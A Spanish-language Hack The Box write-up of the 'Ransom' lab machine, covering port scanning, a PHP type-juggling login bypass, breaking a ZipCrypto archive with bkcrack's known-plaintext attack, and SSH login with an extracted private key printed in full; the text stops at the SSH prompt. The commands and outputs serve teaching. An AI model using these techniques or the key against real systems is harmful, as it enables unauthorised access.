---
layout: single
title: Ransom - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Ransom de la plataforma de Hackthebox donde vamos a estar aplicando un Login Bypass con un Type Juggling Attack para poder saltarnos la parte del login ya que nos pedirá una contraseña pero no sabemos como tal cual es, es por eso que explotaremos la vulnerabilidad por una implementación en el código que valida que la contraseña sea correcta gracias a esto podremos descargar un ZIP que es protegido por contraseña pero emplearemos la herramienta Bkcrack para hacer un PlainText Attack y asi poder ver los archivos que tiene dentro la escalada de privilegios es fácil en un archivo de configuración encontraremos una contraseña que la usaremos para el usuario root"
date: 2023-07-05
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-ransom/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Login Bypass
  - Type Juggling Attack
  - PlainText Attack
  - Bkcrack 
  - Decrypting a ZIP
---

<p align="center">
<img src="/assets/images/htb-writeup-ransom/web15.png">
</p>

```bash
❯ ping -c 1 10.10.11.153
PING 10.10.11.153 (10.10.11.153) 56(84) bytes of data.
64 bytes from 10.10.11.153: icmp_seq=1 ttl=63 time=96.2 ms

--- 10.10.11.153 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 96.154/96.154/96.154/0.000 ms
❯ whichSystem.py 10.10.11.153

10.10.11.153 (ttl -> 63): Linux
```

## Portscan

```python
❯ ./nrunscan.sh -i
 Give me the IP target: 10.10.11.153

Starting the scan with nmap
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 18:32 CST
Initiating SYN Stealth Scan at 18:32
Scanning 10.10.11.153 [65535 ports]
Discovered open port 22/tcp on 10.10.11.153
Discovered open port 80/tcp on 10.10.11.153
Completed SYN Stealth Scan at 18:32, 16.11s elapsed (65535 total ports)
Nmap scan report for 10.10.11.153
Host is up, received user-set (0.094s latency).
Scanned at 2023-07-04 18:32:25 CST for 16s
Not shown: 64142 closed tcp ports (reset), 1391 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds
           Raw packets sent: 79732 (3.508MB) | Rcvd: 70618 (2.825MB)

[*] Extracting information...

	[*] IP Target: 10.10.11.153
	[*] Open Ports:  22,80

[*] Ports copied to clipboard


Escaning the services and technologies in the ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 18:32 CST
Nmap scan report for 10.10.11.153
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title:  Admin - HTML5 Admin Template
|_Requested resource was http://10.10.11.153/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.06 seconds
[*] Port 80 or 8080 is open

 Do you want to run the http-enum script of nmap (Y/N)?: N

Thanks for using the script! Happy Hacking
```

## Enumeracion

Estos son los servicios que están corriendo el puerto **80** de la maquina que corresponde a **HTTP** y vemos que nos esta redirigiendo a **login**

```ruby
❯ whatweb http://10.10.11.153
http://10.10.11.153 [302 Found] Apache[2.4.41], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.153], Laravel, Meta-Refresh-Redirect[http://10.10.11.153/login], RedirectLocation[http://10.10.11.153/login], Title[Redirecting to http://10.10.11.153/login]
http://10.10.11.153/login [200 OK] Apache[2.4.41], Bootstrap, Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.153], JQuery[1.9.1], Laravel, PasswordField[password], Script[text/javascript], Title[Admin - HTML5 Admin Template], X-UA-Compatible[IE=edge]
```

Esto es lo que hay 

![](/assets/images/htb-writeup-ransom/web1.png)

Nos pide una contraseña que no tenemos si probamos con inyecciones **SQL** o alguna otra cosa no pasa nada pero si hacemos un `ctrl+shift+c` vemos que se están usando **cookies**

![](/assets/images/htb-writeup-ransom/web2.png)

Si interceptamos con `Burpsuite` al momento de darle al botón de **login** vemos que nos redirige a `api` y se tramita la petición por `GET`

![](/assets/images/htb-writeup-ransom/web3.png)

Bueno vamos a emplear `Fuzzing` en busca de rutas que contemplen extensiones `php` ya que la web interpreta `php` pero aun así no encontramos nada

```bash
❯ gobuster dir -u http://10.10.11.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.153
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/07/04 18:45:10 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 6104]
/index.php            (Status: 302) [Size: 386] [--> http://10.10.11.153/index.php/login]
/register             (Status: 500) [Size: 604276]                                       
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.153/css/]           
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.153/js/]            
/fonts                (Status: 301) [Size: 312] [--> http://10.10.11.153/fonts/] 
```

## Login Bypass 

Pues bueno lo que podemos tratar de hacer es interactuar con la parte nos piden la contraseña así vamos a mandar la petición que ya hicimos con **Burpsuite** al **Repeater**
- Si enviamos la petición por `GET` nos dicen que `Invalid Password`

![](/assets/images/htb-writeup-ransom/web4.png)

Algo que podemos hacer es cambiar como se va a tramitar la petición en vez de `GET` lo cambiamos a `POST` para ver como se tramita la petición

![](/assets/images/htb-writeup-ransom/web5.png)

Bueno ahora algo que podemos hacer es cambiar la petición a `GET` pero manualmente ya que nos da un código de estado `405` entonces donde dice **POST** lo cambiaremos manualmente por **GET**

Si enviamos la petición y la vemos el **Content-Type** es `JSON`

![](/assets/images/htb-writeup-ransom/web7.png)

Algo que podemos hacer es poner la contraseña en formato `JSON` y cambiar el **Content-Type** a `JSON` ya que se necesita tramitar la petición en ese formato ya que nos dice que la contraseña es necesaria vamos a ponerlo

![](/assets/images/htb-writeup-ransom/web8.png)

Y bueno pues funciono vemos que básicamente esta funcionando aunque nos diga que la contraseña no es valida eso es debido a que no estamos poniendo la contraseña correcta pero aun así esta funcionando

# Type Juggling

>Un ataque de **Type Juggling** (o “**cambio de tipo**” en español) es una técnica utilizada en programación para **manipular** el **tipo de dato** de una variable con el fin de engañar a un programa y hacer que éste haga algo que no debería, Un ejemplo común de cómo se puede utilizar un ataque de Type Juggling para burlar la autenticación es en un sistema que utiliza comparaciones de cadena para verificar las contraseñas de los usuarios. En lugar de proporcionar una contraseña válida, el atacante podría proporcionar una cadena que se parece a una contraseña válida, pero que en realidad no lo es 

-  <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling>

- <https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#type-juggling-for-php-obfuscation>

Podemos probar esto 

![](/assets/images/htb-writeup-ransom/web9.png)

Si esta empleando la comparativa vamos a ver si es posible

Si ponemos `0` funciona como nos decían `A string which doesn't start with a number is equals to a number`

Igual funciona si ponemos `true`

![](/assets/images/htb-writeup-ransom/web10.png)

Vamos a hacer lo mismo pero desde el **Intercept** para darla **forward** y a si poder estar **logueados**

![](/assets/images/htb-writeup-ransom/web11.png)

Y funciona 

![](/assets/images/htb-writeup-ransom/web12.png)

## User.txt 

Vemos la **flag** y un **.zip** si vemos la **flag** podemos verla 

![](/assets/images/htb-writeup-ransom/web13.png)

# homedirectory.zip

Vamos a descargarnos el archivo `.zip`

```bash
❯ file uploaded-file-3422.zip
uploaded-file-3422.zip: Zip archive data, at least v2.0 to extract
```

Si los descomprimimos nos pide contraseña 

```bash
❯ unzip uploaded-file-3422.zip
Archive:  uploaded-file-3422.zip
[uploaded-file-3422.zip] .bash_logout password: 
```

Vamos a examinar que es lo que hay dentro del comprimido

```bash
❯ 7z l uploaded-file-3422.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: uploaded-file-3422.zip

--
Path = uploaded-file-3422.zip
Type = zip
Physical Size = 7735

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-25 06:03:22 .....          220          170  .bash_logout
2020-02-25 06:03:22 .....         3771         1752  .bashrc
2020-02-25 06:03:22 .....          807          404  .profile
2021-07-02 12:58:14 D....            0            0  .cache
2021-07-02 12:58:14 .....            0           12  .cache/motd.legal-displayed
2021-07-02 12:58:19 .....            0           12  .sudo_as_admin_successful
2022-03-07 06:32:54 D....            0            0  .ssh
2022-03-07 06:32:25 .....         2610         1990  .ssh/id_rsa
2022-03-07 06:32:46 .....          564          475  .ssh/authorized_keys
2022-03-07 06:32:54 .....          564          475  .ssh/id_rsa.pub
2022-03-07 06:32:54 .....         2009          581  .viminfo
------------------- ----- ------------ ------------  ------------------------
2022-03-07 06:32:54              10545         5871  9 files, 2 folders
```

Bueno aquí podemos ver que se esta empleando `ZipCrypto`

```python
❯ 7z l -slt uploaded-file-3422.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: uploaded-file-3422.zip

--
Path = uploaded-file-3422.zip
Type = zip
Physical Size = 7735

----------
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 06:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
```

Si probamos **crackeando** con el **rockyou.txt** y **john** no vamos a lograr nada

```python
❯ zip2john uploaded-file-3422.zip > hash
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.bash_logout PKZIP Encr: 2b chk, TS_chk, cmplen=170, decmplen=220, crc=6CE3189B
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.bashrc PKZIP Encr: 2b chk, TS_chk, cmplen=1752, decmplen=3771, crc=AB254644
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.profile PKZIP Encr: 2b chk, TS_chk, cmplen=404, decmplen=807, crc=D1B22A87
ver 1.0 uploaded-file-3422.zip/.cache/ is not encrypted, or stored with non-handled compression type
ver 1.0 efh 5455 efh 7875 uploaded-file-3422.zip/.cache/motd.legal-displayed PKZIP Encr: 2b chk, TS_chk, cmplen=12, decmplen=0, crc=0
ver 1.0 efh 5455 efh 7875 uploaded-file-3422.zip/.sudo_as_admin_successful PKZIP Encr: 2b chk, TS_chk, cmplen=12, decmplen=0, crc=0
ver 1.0 uploaded-file-3422.zip/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.ssh/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1990, decmplen=2610, crc=38804579
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.ssh/authorized_keys PKZIP Encr: 2b chk, TS_chk, cmplen=475, decmplen=564, crc=CB143C32
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.ssh/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=475, decmplen=564, crc=CB143C32
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.viminfo PKZIP Encr: 2b chk, TS_chk, cmplen=581, decmplen=2009, crc=396B04B4
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2023-07-04 19:51) 0g/s 6829Kp/s 6829Kc/s 6829KC/s !!rebound!!..*7¡Vamos!
Session completed
```

Pero como sabemos que se esta empleando `ZipCrypto Deflate` si investigamos encontramos esto <https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8>

Si lo analizamos esta usando esta herramienta <https://github.com/kimci86/bkcrack>

![](/assets/images/htb-writeup-ransom/web14.png)

Pero tenemos que pesarle un archivo en texto claro para después hacer un **zip** y debe de ser un archivo que no tenga muchas lineas y no suela cambiar su contenido uno de ellos es el **bash_logout** <https://github.com/vroncevic/bash_env/blob/master/bash_logout>

Podemos tomarlo como ejemplo y editarlo para poder usarlo ya que si lo editamos tiene mismos números de caracteres que el del **.zip** que no podemos ver aun 

```bash
❯ wc -c .bash_logout
220 .bash_logout
❯ catn .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
```

Bueno elegimos ese archivo ya que lo mas probable es que sea muy semejante y para el ataque necesitamos uno que pueda ser igual a algún archivo que esta en el **.zip**

```python
❯ git clone https://github.com/kimci86/bkcrack
Clonando en 'bkcrack'...
remote: Enumerating objects: 996, done.
remote: Counting objects: 100% (475/475), done.
remote: Compressing objects: 100% (140/140), done.
remote: Total 996 (delta 359), reused 390 (delta 329), pack-reused 521
Recibiendo objetos: 100% (996/996), 302.21 KiB | 1.43 MiB/s, listo.
Resolviendo deltas: 100% (678/678), listo.
❯ cd bkcrack
❯ cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install
cmake --build build --config Release
cmake --build build --config Release --target install

-- The CXX compiler identification is GNU 10.2.1
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Setting build type to 'Release' as none was specified.
-- Found OpenMP_CXX: -fopenmp (found suitable version "4.5", minimum required is "2.0") 
-- Found OpenMP: TRUE (found suitable version "4.5", minimum required is "2.0")  
-- Configuring done
-- Generating done
-- Build files have been written to: /home/miguel7/Hackthebox/Ransom/content/bkcrack/build
[  5%] Building CXX object src/CMakeFiles/bkcrack.dir/Arguments.cpp.o
[ 11%] Building CXX object src/CMakeFiles/bkcrack.dir/Attack.cpp.o
[ 16%] Building CXX object src/CMakeFiles/bkcrack.dir/ConsoleProgress.cpp.o
[ 22%] Building CXX object src/CMakeFiles/bkcrack.dir/Crc32Tab.cpp.o
[ 27%] Building CXX object src/CMakeFiles/bkcrack.dir/Data.cpp.o
[ 33%] Building CXX object src/CMakeFiles/bkcrack.dir/Keys.cpp.o
[ 38%] Building CXX object src/CMakeFiles/bkcrack.dir/KeystreamTab.cpp.o
[ 44%] Building CXX object src/CMakeFiles/bkcrack.dir/MultTab.cpp.o
[ 50%] Building CXX object src/CMakeFiles/bkcrack.dir/Progress.cpp.o
[ 55%] Building CXX object src/CMakeFiles/bkcrack.dir/VirtualTerminalSupport.cpp.o
[ 61%] Building CXX object src/CMakeFiles/bkcrack.dir/Zip.cpp.o
[ 66%] Building CXX object src/CMakeFiles/bkcrack.dir/Zreduction.cpp.o
[ 72%] Building CXX object src/CMakeFiles/bkcrack.dir/file.cpp.o
[ 77%] Building CXX object src/CMakeFiles/bkcrack.dir/log.cpp.o
[ 83%] Building CXX object src/CMakeFiles/bkcrack.dir/main.cpp.o
[ 88%] Building CXX object src/CMakeFiles/bkcrack.dir/password.cpp.o
[ 94%] Building CXX object src/CMakeFiles/bkcrack.dir/types.cpp.o
[100%] Linking CXX executable bkcrack
[100%] Built target bkcrack
[100%] Built target bkcrack
Install the project...
❯ cd install
❯ ls
 example   tools   bkcrack   license.txt   readme.md
```

Y bueno funciona aquí tenemos el panel de ayuda

```bash
❯ ./bkcrack -h
bkcrack 1.5.0 - 2023-07-04
usage: bkcrack [options]
Crack legacy zip encryption with Biham and Kocher's known plaintext attack.

Options to get the internal password representation:
 -c, --cipher-file <file>    Zip entry or file on disk containing ciphertext
     --cipher-index <index>  Index of the zip entry containing ciphertext
 -C, --cipher-zip <archive>  Zip archive containing the ciphertext entry

 -p, --plain-file <file>     Zip entry or file on disk containing plaintext
     --plain-index <index>   Index of the zip entry containing plaintext
 -P, --plain-zip <archive>   Zip archive containing the plaintext entry
 -t, --truncate <size>       Maximum number of bytes of plaintext to load
 -o, --offset <offset>       Known plaintext offset relative to ciphertext
                              without encryption header (may be negative)
 -x, --extra <offset> <data> Additional plaintext in hexadecimal starting
                              at the given offset (may be negative)
     --ignore-check-byte     Do not automatically use ciphertext's check byte
                              as known plaintext

     --password <password>   Password from which to derive the internal password
                              representation. Useful for testing purposes and
                              advanced scenarios such as reverting the effect of
                              the --change-password command.

Options to use the internal password representation:
 -k, --keys <X> <Y> <Z>      Internal password representation as three 32-bits
                              integers in hexadecimal (requires -d, -U,
                              --change-keys or --bruteforce)

 -d, --decipher <file>       File to write the deciphered data (requires -c)
     --keep-header           Write the encryption header at the beginning of
                              deciphered data instead of discarding it

 -U, --change-password <archive> <password>
        Create a copy of the encrypted zip archive with the password set to the
        given new password (requires -C)

     --change-keys <archive> <X> <Y> <Z>
        Create a copy of the encrypted zip archive using the given new internal
        password representation (requires -C)

 -b, --bruteforce <charset>
        Try to recover the password or an equivalent one by generating and
        testing password candidates using characters in the given charset.
        The charset is a sequence of characters or shortcuts for predefined
        charsets listed below. Example: ?l?d-.@

          ?l lowercase letters              abcdefghijklmnopqrstuvwxyz
          ?u uppercase letters              ABCDEFGHIJKLMNOPQRSTUVWXYZ
          ?d decimal digits                 0123456789
          ?s special characters              !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
          ?a alpha-numerical characters     (same as ?l?u?d)
          ?p printable ASCII characters     (same as ?l?u?d?s)
          ?b all bytes                      (0x00 - 0xff)

 -l, --length [ <min>..<max> | <min>.. | ..<max> | <length> ]
        Length interval or exact length of password candidates to generate and
        test during password recovery (requires --bruteforce)

 -r, --recover-password [ <min>..<max> | <min>.. | ..<max> | <max> ] <charset>
        Shortcut for --length and --bruteforce options

Other options:
 -e, --exhaustive            Exhaustively look for all solutions (keys or
                              passwords) instead of stopping after the first
                              solution is found
 -L, --list <archive>        List entries in a zip archive and exit
 -h, --help                  Show this help and exit

Environment variables:
 OMP_NUM_THREADS             Number of threads to use for parallel computations
❯ mv ../../uploaded-file-3422.zip .
❯ cp ../../.bash_logout .
❯ mv .bash_logout bash_logout
```

Lo primero que necesitamos es crear un **.zip** que contenga el `bash_logout` 

```python
❯ zip plain.zip bash_logout
  adding: bash_logout (deflated 28%)
```

Ahora ejecutamos la herramienta para obtener las **keys** que necesitamos

```bash
❯ ./bkcrack -C uploaded-file-3422.zip -c ".bash_logout" -P plain.zip -p "bash_logout"
bkcrack 1.5.0 - 2023-07-04
[20:31:23] Z reduction using 151 bytes of known plaintext
100.0 % (151 / 151)
[20:31:24] Attack on 56903 Z values at index 6
Keys: 7b549874 ebc25ec5 7e465e18
75.5 % (42939 / 56903)
[20:36:32] Keys
7b549874 ebc25ec5 7e465e18
```

Ahora le vamos a indicar las **keys** y nos vamos a crear un nuevo comprimido y le asignaremos una contraseña 

```bash
❯ ./bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U newcomprimido.zip password
bkcrack 1.5.0 - 2023-07-04
[20:47:55] Writing unlocked archive newcomprimido.zip with password "password"
100.0 % (9 / 9)
Wrote unlocked archive.
```

El nuevo **newcomprimido.zip** vemos que tiene lo mismo 

```python
❯ ls
 example   bash_logout   license.txt         plain.zip   uploaded-file-3422.zip
 tools     bkcrack       newcomprimido.zip   readme.md  
❯ 7z l newcomprimido.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: newcomprimido.zip

--
Path = newcomprimido.zip
Type = zip
Physical Size = 7735

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-25 06:03:22 .....          220          170  .bash_logout
2020-02-25 06:03:22 .....         3771         1752  .bashrc
2020-02-25 06:03:22 .....          807          404  .profile
2021-07-02 12:58:14 D....            0            0  .cache
2021-07-02 12:58:14 .....            0           12  .cache/motd.legal-displayed
2021-07-02 12:58:19 .....            0           12  .sudo_as_admin_successful
2022-03-07 06:32:54 D....            0            0  .ssh
2022-03-07 06:32:25 .....         2610         1990  .ssh/id_rsa
2022-03-07 06:32:46 .....          564          475  .ssh/authorized_keys
2022-03-07 06:32:54 .....          564          475  .ssh/id_rsa.pub
2022-03-07 06:32:54 .....         2009          581  .viminfo
------------------- ----- ------------ ------------  ------------------------
2022-03-07 06:32:54              10545         5871  9 files, 2 folders
```

Ahora vamos a pesarle la contraseña que establecimos

```python
❯ unzip newcomprimido.zip
Archive:  newcomprimido.zip
[newcomprimido.zip] .bash_logout password: 
  inflating: .bash_logout            
  inflating: .bashrc                 
  inflating: .profile                
   creating: .cache/
 extracting: .cache/motd.legal-displayed  
 extracting: .sudo_as_admin_successful  
   creating: .ssh/
  inflating: .ssh/id_rsa             
  inflating: .ssh/authorized_keys    
  inflating: .ssh/id_rsa.pub         
  inflating: .viminfo      
```

## Shell as htb 

Si nos metemos al directorio **.ssh** vemos la **id_rsa**

```python
❯ cd .ssh
❯ ls
 authorized_keys   id_rsa   id_rsa.pub
❯ catn id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
❯ chmod 600 id_rsa
```

Pero no sabemos el usuario para eso vamos a ver la **id_rsa.pub** para ver a quien le pertenece 

```python
❯ cat id_rsa.pub
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa.pub
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrDTHWkTw0RUfAyzj9U3Dh+ZwhOUvB4EewA+z6uSunsTo3YA0GV/j6EaOwNq6jdpNrb9T6tI+RpcNfA+i
       │ cFj+6oRj8hOa2q1QPfbaej2uY4MvkVC+vGac1BQFs6gt0BkWM9JY7nYJ2y0SIibiLDDB7TwOx6gem4Br/35PW2sel8cESyR7JfGjuauZM/DehjJJGfqmeuZ
       │ 2Yd2Umr4rAt0R4OEAcWpOX94Tp+JByPAT5m0CU557KyarNlW60vy79njr8DR8BljDtJ4n9BcOPtEn+7oYvcLVksgM4LB9XzdDiXzdpBcyi3+xhFznFKDYUf
       │ 6NfAud2sEWae7iIsCYtmjx6Jr9Zi2MoUYqWXSal8o6bQDIDbyD8hApY5apdqLtaYMXpv+rMGQP5ZqoGd3izBM9yZEH8d9UQSSyym/te07GrCax63tb6lYgU
       │ oUPxVFCEN4RmzW1VuQGvxtfhu/rK5ofQPac8uaZskY3NWLoSF56BQqEG9waI4pCF5/Cq413N6/M= htb@ransom
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora tenemos el usuario `htb` y su `id_rsa` y nos podemos conectar por `SSH`

```powershell
❯ ssh -i id_rsa htb@10.10.11.153
The authenticity of host '10.10.11.153 (10.10.11.153)' can't be established.
ECDSA key fingerprint is SHA256:tT45oQAnI0hnOIQg3ZvtoS4RG00xhxxBJua12YRVv2g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
